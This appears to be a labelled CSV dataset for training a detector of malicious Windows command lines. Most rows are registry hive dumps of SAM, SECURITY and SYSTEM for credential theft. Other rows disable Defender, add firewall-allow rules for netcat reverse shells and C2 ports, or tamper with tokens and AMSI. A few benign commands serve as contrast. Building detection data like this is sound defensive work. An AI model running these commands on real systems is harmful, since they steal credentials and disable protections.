text,label
reg save hklm\sam c:\windows\temp\ardh5i9a.save,1
reg export hklm\security c:\windows\temp\luv81ih7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\yv1i0uzo.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\aovlaqcv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xfqlw8pg.dat""",1
reg export hklm\security c:\windows\temp\ebzuleot.save,1
reg export hklm\system c:\windows\temp\ocxm6tn4.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\bzb3rv5g.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\yo74k2j5.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\boon0qgb.dat""",1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""set-mppreference   -disablerealtimemonitoring   $true""",2
"cmd.exe /c ""reg save hklm\security c:\temp\ihn5tqac.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6k9pgxbg.dat""",1
reg save hklm\sam c:\windows\temp\zkg5ps4e.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg export hklm\security c:\temp\60ccn625.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\5sw95l9i.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ccfy3sqf.dat""",1
reg save hklm\system c:\windows\temp\he5n7fmw.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\glh5zuga.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ht1vx3tv.dat""",1
"cmd.exe /c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg save hklm\system c:\windows\temp\38pb2tpg.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\dajgsnrx.dat""",1
reg save hklm\security c:\windows\temp\pui785iw.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\j8l6rku7.dat""",1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ys4d5r8u.dat""",1
reg save hklm\system c:\windows\temp\uukkzv4r.save,1
reg  save  hklm\system  c:\windows\temp\jsfkvj2l.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\v3n76kzs.save,1
reg export hklm\sam c:\windows\temp\smy8xioh.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\j1f12uqg.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ju96lxrg.dat""",1
reg export hklm\sam c:\windows\temp\e8cn4ol7.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ib3s5nsu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\24ikfxd5.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\z6ip0m35.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ix9b0u8u.dat""",1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""reg export hklm\security c:\temp\b3822mqt.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\i120t06o.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iwftlujr.dat""",1
reg export hklm\system c:\windows\temp\qbm7qdad.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\yrml8tfc.dat""",1
reg  save  hklm\sam  c:\windows\temp\3fo2ynfi.save,1
reg export hklm\system c:\windows\temp\ku9wz5ed.save,1
reg save hklm\security c:\windows\temp\evbyi6qc.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\518rzpu0.dat""",1
reg save hklm\sam c:\windows\temp\vkgap94r.save,1
reg export hklm\security c:\windows\temp\xk24xasv.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\96fj8e64.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\a7khkikl.dat""",1
reg save hklm\security c:\windows\temp\eded83i7.save,1
reg save hklm\sam c:\windows\temp\at1wppxe.save,1
$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
reg export hklm\system c:\windows\temp\nwew59sr.save,1
reg export hklm\security c:\windows\temp\wr10w7a4.save,1
reg save hklm\sam c:\windows\temp\dxgflr0r.save,1
"powershell -nop -c ""netsh dump > netconfig.txt""",0
reg export hklm\security c:\windows\temp\c0y2vb0k.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\2qi0kov7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\71olwr6e.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4e5bn5h4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\m1o0gr3d.dat""",1
reg save hklm\system c:\windows\temp\vj74ygs7.save,1
"cmd.exe /c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\e95ecw5t.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\mi5v56c8.dat""",1
reg export hklm\sam c:\windows\temp\nhvipyfs.save,1
reg export hklm\sam c:\windows\temp\i5hzzdi8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\f0iro573.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\5gyhlpw7.dat""",1
reg export hklm\system c:\windows\temp\2hfxq29k.save,1
reg save hklm\system c:\windows\temp\5wgaxmhe.save,1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\4ooh6do8.dat""""",1
reg save hklm\system c:\windows\temp\vscsup13.save,1
reg save hklm\security c:\windows\temp\4cc0z4kc.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k4hk1rql.dat""",1
reg save hklm\system c:\windows\temp\w0bgh7za.save,1
reg export hklm\sam c:\windows\temp\sg8zff3i.save,1
reg save hklm\sam c:\windows\temp\ynpx5ukg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\688cluqn.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\j2atdzyi.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\8v81mkdj.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\syzeaqid.dat""",1
reg export hklm\system c:\windows\temp\264g1047.save,1
reg save hklm\sam c:\windows\temp\lwdnvm4u.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q6zaveok.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7l691igs.dat""",1
reg save hklm\system c:\windows\temp\30ay0fpy.save,1
reg save hklm\system c:\windows\temp\43b4haxq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\d95bt8mc.dat""",1
reg save hklm\security c:\windows\temp\h9ab2575.save,1
reg save hklm\security c:\windows\temp\3058bf88.save,1
reg save hklm\system c:\windows\temp\igkn6iul.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9clsffm5.dat""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\1jfx1ckn.save""",1
reg save hklm\system c:\windows\temp\9dgbz5zn.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b1ohjwli.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\8gzbpsaz.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\nj2ybz0i.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\c87sj082.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8gm5eskv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\q4f3nma1.dat""",1
"powershell -nop -c ""sc  stop  windefend""",2
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\mdd3lu4g.save""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\a29rc0dk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hjdz7prb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\8hslhvxa.dat""",1
reg export hklm\system c:\windows\temp\x9r0a9ki.save,1
reg export hklm\sam c:\windows\temp\vuwcmi0l.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\9jjr3x1t.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\rwxcvir2.save""",1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg export hklm\security c:\temp\sbnqa31o.dat""",1
reg save hklm\sam c:\windows\temp\weaeo7w7.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\kd57rkts.dat""""",1
reg export hklm\system c:\windows\temp\6koto9fd.save,1
reg export hklm\security c:\windows\temp\dyxzjm4s.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\r27bp4su.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\8lgz3sto.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\m8aa5bkm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\kgtlvrd7.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
reg save hklm\security c:\windows\temp\0gjyyhym.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\j37hy3db.dat""",1
reg export hklm\security c:\windows\temp\i8a7kpwv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fusqo0tv.dat""",1
reg export hklm\security c:\windows\temp\bk8ngsmc.save,1
reg export hklm\sam c:\windows\temp\kfsaprkk.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\9lm0wsbc.dat""",1
reg save hklm\sam c:\windows\temp\b01hoy2b.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\70ygl5ar.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rtkim9om.dat""",1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""sc  query  windefend""",0
reg export hklm\security c:\windows\temp\oy1q0foh.save,1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\3jqdxs6j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\m3y8coxn.dat""",1
reg save hklm\sam c:\windows\temp\jhcosg9g.save,1
reg export hklm\sam c:\windows\temp\9iccxw39.save,1
reg export hklm\security c:\windows\temp\pma1c50a.save,1
reg export hklm\system c:\windows\temp\usx4rtd1.save,1
reg export hklm\security c:\windows\temp\6rp1u5as.save,1
reg export hklm\system c:\windows\temp\pqhr8kxp.save,1
reg save hklm\system c:\windows\temp\0rbrss5c.save,1
reg save hklm\sam c:\windows\temp\coizancx.save,1
reg save hklm\system c:\windows\temp\jszrizgu.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\5b5t2f1k.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rmjjcgk4.dat""",1
reg export hklm\security c:\windows\temp\fpyhgrau.save,1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\737olv9d.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2ug05mo6.dat""",1
reg export hklm\system c:\windows\temp\zxfd2sq9.save,1
rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg export hklm\security c:\temp\n6ozzldi.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\qdyptn0r.dat""""",1
reg save hklm\security c:\windows\temp\vuy6nzwb.save,1
reg save hklm\security c:\windows\temp\mi9gxzz8.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\security c:\windows\temp\nr7gqgz7.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\sam c:\windows\temp\hwpd1vvh.save,1
reg save hklm\security c:\windows\temp\0mf32m30.save,1
reg save hklm\system c:\windows\temp\yjlaifar.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)",3
"cmd.exe /c ""node   server.js   --port   3000""",0
reg export hklm\sam c:\windows\temp\fs9ql30j.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\yuwrr7r8.save""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\system c:\windows\temp\z1jd051l.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\f0iokq6h.dat""",1
reg save hklm\system c:\windows\temp\23hb0z4i.save,1
reg save hklm\system c:\windows\temp\g5wmfbnx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\k22p9pwl.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uec166hd.dat""",1
reg save hklm\system c:\windows\temp\ob712x7i.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\06fi3vmu.dat""""",1
reg save hklm\security c:\windows\temp\epudokfr.save,1
reg export hklm\system c:\windows\temp\8dd65wl8.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\p2o8jsys.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4jtnitee.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7p64ocnp.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1165pqw0.dat""",1
reg export hklm\security c:\windows\temp\wh30depc.save,1
reg save hklm\sam c:\windows\temp\961c0a7g.save,1
reg   export   hklm\security   c:\windows\temp\852t3f5r.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\jc2xjcuw.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\czn8pwqa.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0ahawz1a.dat""",1
reg  export  hklm\sam  c:\windows\temp\b9tt66aq.save,1
"cmd.exe /c ""ipconfig   /all""",0
"powershell -nop -c ""python -m http.server 8080""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\77cf42pc.dat""",1
"cmd.exe /c ""ping   8.8.8.8""",0
reg save hklm\system c:\windows\temp\x0n7pq7k.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\lhmc31nj.dat""",1
reg export hklm\system c:\windows\temp\aknce91a.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\tf7ijoo5.dat""",1
reg save hklm\system c:\windows\temp\15r6u20p.save,1
reg save hklm\system c:\windows\temp\1fvhfpvh.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\4xlvu2dg.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\oouvd3pi.dat""",1
reg save hklm\security c:\windows\temp\wkfqrull.save,1
reg save hklm\sam c:\windows\temp\0yb6nwmn.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\dipkbtes.dat""",1
reg save hklm\sam c:\windows\temp\33ihkp69.save,1
reg export hklm\system c:\windows\temp\pcb83yiq.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\isg5zgrg.save""",1
reg export hklm\security c:\windows\temp\px58mwjj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\94bgzehn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3v2z89sp.dat""",1
reg save hklm\sam c:\windows\temp\msy7p3qb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\25dak8r1.dat""",1
reg export hklm\security c:\windows\temp\rlo9iuqn.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\6du2qo9k.save,1
reg save hklm\security c:\windows\temp\pl9s402c.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\3bdkfdqi.dat""",1
reg export hklm\sam c:\windows\temp\169kijme.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\iohmhud3.save""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\gond3x5q.save""",1
reg save hklm\system c:\windows\temp\uar2uxzt.save,1
reg export hklm\system c:\windows\temp\jb1336gc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bl2wv735.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\nk4o4u70.dat""""",1
reg export hklm\security c:\windows\temp\frizrs45.save,1
reg export hklm\sam c:\windows\temp\tb2fv44p.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\hef0rpon.dat""""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\hfy41w6i.dat""",1
"cmd.exe /c ""get-help adjusttokenprivileges -full""",0
reg export hklm\sam c:\windows\temp\1n2791m3.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\z5d2nsr3.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\xf121wfj.dat""""",1
reg save hklm\system c:\windows\temp\p2v7ujst.save,1
reg export hklm\sam c:\windows\temp\755l24ih.save,1
reg export hklm\security c:\windows\temp\imj6doop.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\b7qpuqjf.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\irxl08dq.dat""",1
reg export hklm\system c:\windows\temp\nbsjvrzq.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\bq3mlgny.dat""",1
ipconfig  /all,0
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\sam c:\windows\temp\5p1e5eap.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\4hi31omx.dat""",1
reg save hklm\sam c:\windows\temp\6z2fztoi.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\r2bvolad.dat""",1
"cmd.exe /c ""node server.js --port 3000""",0
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\zl8f9f79.dat""""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\qn55cr4z.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\o7nu3ano.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0isb6kel.dat""",1
reg save hklm\security c:\windows\temp\mxccpigi.save,1
reg export hklm\security c:\windows\temp\c60e90rb.save,1
reg export hklm\system c:\windows\temp\h75b9tc5.save,1
reg   save   hklm\security   c:\windows\temp\fyi4n5lk.save,1
reg  export  hklm\sam  c:\windows\temp\sflowgaz.save,1
reg save hklm\sam c:\windows\temp\dt0sdwpw.save,1
reg export hklm\system c:\windows\temp\zgd4g35v.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\30shhfz9.dat""",1
reg save hklm\system c:\windows\temp\wwzs3622.save,1
reg save hklm\sam c:\windows\temp\8zwk04ij.save,1
"powershell -nop -c ""netsh  dump  >  netconfig.txt""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\zh4v7w1n.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ujktahcr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7m5ybsgb.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\security c:\windows\temp\umiry0jk.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\o7k91nn4.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\k9nd21ue.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\lxp2cv35.dat""",1
reg save hklm\sam c:\windows\temp\me6n6zee.save,1
reg save hklm\security c:\windows\temp\st2xps70.save,1
reg save hklm\security c:\windows\temp\luhrrgqo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\f8d2zkgn.dat""",1
"powershell -nop -c ""ping  8.8.8.8""",0
"cmd.exe /c ""reg save hklm\security c:\temp\y6nnakba.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jngu9o7u.dat""",1
reg save hklm\sam c:\windows\temp\k68v8yz0.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\8op6b48l.dat""""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\8erpnybt.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nihn5s0r.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3wkbq71u.dat""",1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\hmw0mq0f.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0q5kthir.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7cnmh34k.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gaom3uci.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\8lgmh84l.save""",1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\coe7hqyd.save,1
reg save hklm\sam c:\windows\temp\nuhvqbw8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\517ol0f9.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\5pvii1uq.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yr691txi.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\zlspuhy2.dat""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\5bgo0kc3.dat""""",1
set-mppreference   -disablerealtimemonitoring   $true,2
"cmd.exe /c ""klist purge""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\4z9tryz8.dat""",1
reg   save   hklm\sam   c:\windows\temp\9tqaze55.save,1
$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
reg save hklm\sam c:\windows\temp\8vf36tc8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hd21mtgq.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\3aqfhz7k.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\auhmb7d1.dat""",1
reg save hklm\security c:\windows\temp\b4sw3g6s.save,1
reg save hklm\system c:\windows\temp\ma6fzdbf.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\security c:\windows\temp\1zp81thp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5sltm8wx.dat""",1
reg   export   hklm\system   c:\windows\temp\q9frvo2h.save,1
reg save hklm\security c:\windows\temp\4xxit5br.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9hdpulkg.dat""",1
reg export hklm\security c:\windows\temp\m85im30d.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg  save  hklm\system  c:\windows\temp\lyijm303.save,1
reg export hklm\system c:\windows\temp\zkn61ktp.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\qjuoo0q7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\kompggle.dat""",1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\50t5z1so.save""",1
reg save hklm\security c:\windows\temp\iyp0x6jt.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\92re1sia.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1fns4spr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\eg5cr60m.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ewqqrdco.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ylxb0tv1.dat""",1
reg save hklm\sam c:\windows\temp\bdgjvw1p.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\q8hnq12n.dat""",1
"powershell -nop -c ""netsh   dump   >   netconfig.txt""",0
reg export hklm\security c:\windows\temp\tfyw3f0g.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\17vtppwk.dat""",1
"powershell -nop -c ""wmic   product   get   name,   version""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\qrhnibuq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yg65xyuz.dat""",1
reg save hklm\security c:\windows\temp\9i3nc7qw.save,1
reg export hklm\security c:\windows\temp\9pjjqxkg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\gaj6lzl8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\dcgt83uz.dat""",1
reg export hklm\system c:\windows\temp\ngemek7b.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\66d6u6v8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2881svcy.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\npjd76oi.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\t12gbsg4.dat""",1
reg export hklm\security c:\windows\temp\y2izsicg.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\i9y9whbv.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\mfijz5ro.dat""",1
reg save hklm\security c:\windows\temp\wkwj7yy6.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3ajcv3ma.dat""",1
reg save hklm\security c:\windows\temp\o9u055st.save,1
reg export hklm\security c:\windows\temp\shqubp2w.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\szkgo5k2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\caq5kry5.dat""",1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\sam c:\windows\temp\1nyqrnq3.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\n4j4xv7s.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dtyqg5tz.dat""",1
